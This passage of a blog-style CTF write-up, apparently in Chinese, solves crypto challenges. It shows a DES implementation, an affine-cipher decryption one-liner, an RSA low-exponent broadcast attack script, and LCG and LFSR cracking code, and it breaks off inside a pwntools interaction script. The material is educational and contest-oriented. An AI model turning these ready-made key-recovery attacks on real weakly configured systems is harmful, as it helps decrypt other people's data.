class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>,</span><br><span class="line">      <span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>,</span><br><span class="line">      <span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>,</span><br><span class="line">      <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, ],</span><br><span class="line">     [<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>,</span><br><span class="line">      <span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>,</span><br><span class="line">      <span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line">      <span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>, ],</span><br><span class="line">     [<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>,</span><br><span class="line">      <span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>,</span><br><span class="line">      <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>,</span><br><span class="line">      <span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, ]]</span><br><span class="line">PC_1 = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>,</span><br><span class="line">        <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>,</span><br><span class="line">        <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">        <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>,</span><br><span class="line">        <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>,</span><br><span class="line">        <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>,</span><br><span class="line">        <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>, ]</span><br><span class="line">PC_2 = [<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>,</span><br><span class="line">        <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>, <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">        <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>,</span><br><span class="line">        <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>,</span><br><span class="line">        <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>,</span><br><span class="line">        <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>, ]</span><br><span class="line">P = [<span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line">     <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">     <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>,</span><br><span class="line">     <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">     <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>,</span><br><span class="line">     <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>,</span><br><span class="line">     <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>,</span><br><span class="line">     <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">25</span>, ]</span><br><span class="line">movnum = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">HexToBin</span><span class="params">(string)</span>:</span></span><br><span class="line">    <span class="string">"Convert sixteen to binary"</span></span><br><span class="line"></span><br><span class="line">    Binstring = <span class="string">""</span></span><br><span class="line">    string = string.lower()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            Binstring += hexadecimalcontrast[i]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line">    <span class="keyword">return</span> Binstring</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">BinToStr</span><span class="params">(strbin)</span>:</span></span><br><span class="line">    <span class="string">"Turn the binary string to a ASCII string"</span></span><br><span class="line"></span><br><span class="line">    strten = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(strbin) // <span class="number">8</span>):</span><br><span class="line">        num = <span class="number">0</span></span><br><span class="line">        test = strbin[i * <span class="number">8</span>:i * <span class="number">8</span> + <span class="number">8</span>]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            num += int(test[j]) * (<span class="number">2</span>**(<span class="number">7</span> - j))</span><br><span class="line">        strten += chr(num)</span><br><span class="line">    <span class="keyword">return</span> strten</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">StrToHex</span><span class="params">(string)</span>:</span></span><br><span class="line">    <span class="string">"Converts a string to HEX"</span></span><br><span class="line"></span><br><span class="line">    hexStr = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        tmp = str(hex(ord(i)))</span><br><span class="line">        <span class="keyword">if</span> len(tmp) == <span class="number">3</span>:</span><br><span class="line">            hexStr += tmp.replace(<span class="string">'0x'</span>, <span class="string">'0'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hexStr += tmp.replace(<span class="string">'0x'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span> hexStr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Binxor</span><span class="params">(string1, string2)</span>:</span></span><br><span class="line">    <span class="string">"If the length is different, only the short one is returned."</span></span><br><span class="line"></span><br><span class="line">    strlen = <span class="number">0</span></span><br><span class="line">    xorstr = <span class="string">""</span></span><br><span class="line">    <span class="keyword">if</span> len(string1) &gt; len(string2):</span><br><span class="line">        strlen = len(string2)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        strlen = len(string1)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(strlen):</span><br><span class="line">        <span class="keyword">if</span> string1[i] == string2[i]:</span><br><span class="line">            xorstr += <span class="string">'0'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            xorstr += <span class="string">'1'</span></span><br><span class="line">    <span class="keyword">return</span> xorstr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SubstitutionBox</span><span class="params">(keyfield, sub)</span>:</span></span><br><span class="line"></span><br><span class="line">    newkeyfield = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(sub)):</span><br><span class="line">        newkeyfield += keyfield[sub[i] - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> newkeyfield</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">SubkeyGeneration</span><span class="params">(freq, C, D)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(movnum[freq]):</span><br><span class="line">        C = C[<span class="number">1</span>:] + C[:<span class="number">1</span>]</span><br><span class="line">        D = D[<span class="number">1</span>:] + D[:<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> C, D, SubstitutionBox(C + D, PC_2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enkey</span><span class="params">(secretkey)</span>:</span> </span><br><span class="line"></span><br><span class="line">    netss = SubstitutionBox(HexToBin(StrToHex(secretkey)), PC_1)</span><br><span class="line">    C, D = netss[:<span class="number">28</span>], netss[<span class="number">28</span>:]</span><br><span class="line">    key = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>): </span><br><span class="line">        C, D, keyone = SubkeyGeneration(i, C, D)</span><br><span class="line">        key.append(keyone)</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Sbox</span><span class="params">(plaintext, sub)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> HexToBin(<span class="string">"%x"</span> % S[sub][int(plaintext[:<span class="number">1</span>] + plaintext[<span class="number">-1</span>:], <span class="number">2</span>) * <span class="number">16</span> + int(plaintext[<span class="number">1</span>:<span class="number">-1</span>], <span class="number">2</span>)])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Function</span><span class="params">(plaintext, secretkey)</span>:</span></span><br><span class="line"></span><br><span class="line">    plaintext = Binxor(SubstitutionBox(plaintext, E),</span><br><span class="line">                       secretkey)</span><br><span class="line">    sout = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        sout += Sbox(plaintext[i * <span class="number">6</span>:(i + <span class="number">1</span>) * <span class="number">6</span>], i)</span><br><span class="line">    sout = SubstitutionBox(sout, P)</span><br><span class="line">    <span class="keyword">return</span> sout</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">endecrypt</span><span class="params">(plaintext, secretkey)</span>:</span></span><br><span class="line"></span><br><span class="line">    netss = SubstitutionBox(HexToBin(StrToHex(plaintext)), IP)</span><br><span class="line">    L, R = netss[:<span class="number">32</span>], netss[<span class="number">32</span>:]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        L, R = R, Binxor(L, Function(R, secretkey[i]))</span><br><span class="line">    <span class="keyword">return</span> SubstitutionBox(R + L, IP_1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryption</span><span class="params">(plaintext, secretkey)</span>:</span></span><br><span class="line"></span><br><span class="line">    plaintext = plaintext + (<span class="number">8</span> - len(plaintext) % <span class="number">8</span>) * <span class="string">'\0'</span></span><br><span class="line">    keys = enkey(secretkey[:<span class="number">8</span>])</span><br><span class="line">    print(keys)</span><br><span class="line">    ciphertext = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plaintext) / <span class="number">8</span>):</span><br><span class="line">        ciphertext += endecrypt(plaintext[i * <span class="number">8</span>:(i + <span class="number">1</span>) * <span class="number">8</span>], keys)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(BinToStr(ciphertext))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decryption</span><span class="params">(plaintext, secretkey)</span>:</span></span><br><span class="line">    plaintext = <span class="string">"t2GzuEfVDaJsNLBqC8N7C3/2UgIeCoQLC2qLkT1ukFULskzMc1u9QeFizVUfFYfA"</span></span><br><span class="line">    plaintext = base64.b64decode(plaintext)</span><br><span class="line">    <span class="keyword">print</span> plaintext</span><br><span class="line">    keys = enkey(secretkey[:<span class="number">8</span>])[::<span class="number">-1</span>]</span><br><span class="line">    <span class="comment">#print(keys)</span></span><br><span class="line">    ciphertext = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(plaintext) / <span class="number">8</span>):</span><br><span class="line">        ciphertext += endecrypt(plaintext[i * <span class="number">8</span>:(i + <span class="number">1</span>) * <span class="number">8</span>], keys)</span><br><span class="line">    <span class="keyword">return</span> (BinToStr(ciphertext))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span><span class="params">()</span>:</span></span><br><span class="line">    fw = open(<span class="string">"random"</span>, <span class="string">"w"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">700</span>):</span><br><span class="line">        fw.write(str(random.getrandbits(<span class="number">32</span>))+<span class="string">"\n"</span>)</span><br><span class="line">    fw.close()</span><br><span class="line"></span><br><span class="line">generate()</span><br><span class="line">f = open(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line"></span><br><span class="line">key = str(random.getrandbits(<span class="number">32</span>))</span><br><span class="line">key = <span class="string">'2990136190'</span></span><br><span class="line">ciphertext = decryption(flag, key)</span><br><span class="line"><span class="keyword">print</span> ciphertext</span><br></pre></td></tr></table></figure><h1 id="朱雀组"><a href="#朱雀组" class="headerlink" title="朱雀组"></a>朱雀组</h1><h2 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h2><p>简单仿射加密，就是123456和26不互素，我们用26的一个素因子13代替26先，得到的答案，可以选择：如果不符合uuid格式，就加个13，不过，后来想想，由于uuid只有abcdef加上 ‘flag’ 的lg，模13其实是足够的。所以其实不需要判断。</p><p>由于仿射不加密除字母外的字符，所以直接拼接上来就可以了</p><p>确实simple，解密代码就一行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line">flag = <span class="string">''</span>.join(i <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">"qwertyuiopasdfghjklzxcvbnm"</span> <span class="keyword">else</span> chr(((ord(i)-ord(<span class="string">'a'</span>) - <span class="number">321564</span>))*inverse(<span class="number">123456</span>,<span class="number">13</span>)%<span class="number">13</span>+ord(<span class="string">'a'</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'kgws&#123;m8u8cm65-ue9k-44k5-8361-we225m76eeww&#125;'</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id="RUA"><a href="#RUA" class="headerlink" title="RUA"></a>RUA</h2><p>rsa低加密指数攻击，直接套<a href="https://xz.aliyun.com/t/6459#toc-37" target="_blank" rel="noopener">先知</a>上的一个脚本，刚开始测e=3，发现失败，于是爆破e</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii,gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CRT</span><span class="params">(mi, ai)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(reduce(gmpy2.gcd,mi)==<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">assert</span> (isinstance(mi, list) <span class="keyword">and</span> isinstance(ai, list))</span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (M / m) * gmpy2.invert(M / m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> zip(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x + y, ai_ti_Mi) % M</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        m=gmpy2.iroot(CRT([n1,n2,n3], [c1,c2,c3]), e)[<span class="number">0</span>]</span><br><span class="line">        print(binascii.unhexlify(hex(m)[<span class="number">2</span>:].strip(<span class="string">"L"</span>)))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="guess-game"><a href="#guess-game" class="headerlink" title="guess_game"></a>guess_game</h2><p>两个考点：LCG和LFSR</p><p>LCG攻击原理<a href="https://www.codercto.com/a/35743.html" target="_blank" rel="noopener">这里</a>看，NCTF出现过的。</p><p>LFSR的攻击手法<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/fsr/lfsr-zh/" target="_blank" rel="noopener">ctf-wiki</a>上看。</p><p>解密流程：</p><p>第一步我们通过六个level的值恢复LCG的参数从而预测第七个code，从而达到(500,10)这个level。<del>开局拥有10个coin！</del></p><p>然后我们用9次机会，可以得到72bit的输出，其中前40bit输出逆序可以得到初始的r</p><p>但是这里的lfsr其实是39级的，所以至少需要78bit才能恢复</p><p>所以我们要爆破6bit的输出</p><p>需要说明的是即使有78bit的输出，也有可能因为矩阵没有满秩从而解不出key来。</p><p>然后这里我换了个思路，我硬猜，要求前九次猜中一个，这样我就可以多拿两组数据（其实多拿一次就够了）</p><p>这样我就能拿到80bit的输出，然后我用下面那个sage脚本，根据wiki所述构造矩阵，解个线性方程，得到key。<del>点解密的时候要放《好运来》，增加解密成功的概率，唱《国歌》应该也可以。</del></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">output = &apos;10100010010100010010101001100110000000000111101111011101010101000111110011111011&apos;</span><br><span class="line"></span><br><span class="line">N = 39</span><br><span class="line">F = GF(2)</span><br><span class="line">ans=[]</span><br><span class="line">out = output</span><br><span class="line">Sn = [vector(F,N) for j in range(N+1)]</span><br><span class="line">for j in range(N+1):</span><br><span class="line">    Sn[j] = list(map(int,out[j:j+N]))</span><br><span class="line">    </span><br><span class="line">X = matrix(F,Sn[:N])</span><br><span class="line">invX = (X^-1)</span><br><span class="line">Y = vector(F,Sn[-1])</span><br><span class="line">Cn = Y * invX</span><br><span class="line">res = &apos;&apos;.join(str(i) for i in Cn)</span><br><span class="line">ans.append(int(res[::-1],2))</span><br><span class="line">print (ans)</span><br><span class="line">print(len(ans))</span><br><span class="line"></span><br><span class="line">&gt;&gt; [71834525659]</span><br><span class="line">&gt;&gt; 1</span><br></pre></td></tr></table></figure><p>用于交互的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long,inverse</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_increment</span><span class="params">(states, modulus, multiplier)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    利用伪随机序列s,模数n,乘数m，恢复增数c</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    states:伪随机数序列s</span></span><br><span class="line"><span class="string">    modulus:模数n，</span></span><br><span class="line"><span class="string">    multiplier:乘数m</span></span><br><span class="line"><span class="string">    increment：增量c</span></span><br><span class="line"><span class="string">    return:根据n,m,s0,s1恢复c，并返回</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>]*multiplier) % modulus</span><br><span class="line">    <span class="keyword">return</span> modulus, multiplier, increment</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crack_unknown_multiplier</span><span class="params">(states, modulus)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    利用伪随机序列s和模数n，恢复乘数m</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    states:伪随机数序列s</span></span><br><span class="line"><span class="string">    modulus:模数n，</span></span><br><span class="line"><span class="string">    multiplier:乘数m</span></span><br><span class="line"><span class="string">    return:根据n,s0,s1,s2恢复m，然后利用crack_unknown_increment恢复c</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    multiplier = (states[<span class="number">2</span>] - 